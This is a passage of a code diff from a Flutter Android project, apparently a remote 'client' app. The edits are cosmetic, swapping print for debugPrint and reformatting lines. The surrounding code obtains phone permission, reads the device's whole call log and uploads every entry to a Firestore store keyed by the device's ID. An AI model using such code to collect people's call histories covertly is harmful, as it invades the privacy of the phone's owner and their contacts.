@@ -2,20 +2,19 @@ import 'package:androclient/constant/firebase.constant.dart';
 import 'package:androclient/service/device.dart';
 import 'package:call_log/call_log.dart';
 import 'package:cloud_firestore/cloud_firestore.dart';
+import 'package:flutter/material.dart';
 import 'package:permission_handler/permission_handler.dart';
 
 Future<PermissionStatus> _getCallLogPermission() async {
   final PermissionStatus callLogPermission = await Permission.phone.status;
-  print(callLogPermission);
   if (callLogPermission == PermissionStatus.granted) {
-    print('Permission granted');
+    debugPrint('Permission granted');
   } else if (callLogPermission == PermissionStatus.denied) {
-    print(
-        'Denied. Show a dialog with a reason and again ask for the permission.');
+    debugPrint('Denied. Show a dialog with a reason and again ask for the permission.');
     final PermissionStatus askedpermission = await Permission.phone.request();
     return askedpermission;
   } else if (callLogPermission == PermissionStatus.permanentlyDenied) {
-    print('Take the user to the settings page.');
+    debugPrint('Take the user to the settings page.');
     await openAppSettings();
   }
   return callLogPermission;
@@ -27,16 +26,14 @@ Future<bool> getCallLogs() async {
     if (permissionStatus == PermissionStatus.granted) {
       Iterable<CallLogEntry> logs = await CallLog.get();
       String? androidId = await getIdentity();
-      CollectionReference logsCollection =
-          firestore.collection('client').doc(androidId).collection("logs");
+      CollectionReference logsCollection = firestore.collection('client').doc(androidId).collection("logs");
       var batch = firestore.batch();
       for (var i = 0; i < logs.length; i++) {
         if (i % 300 == 0) {
           await batch.commit();
           batch = firestore.batch();
         }
-        DocumentReference logDocument =
-            logsCollection.doc(logs.elementAt(i).timestamp.toString());
+        DocumentReference logDocument = logsCollection.doc(logs.elementAt(i).timestamp.toString());
         batch.set(
           logDocument,
           Map<String, dynamic>.from(
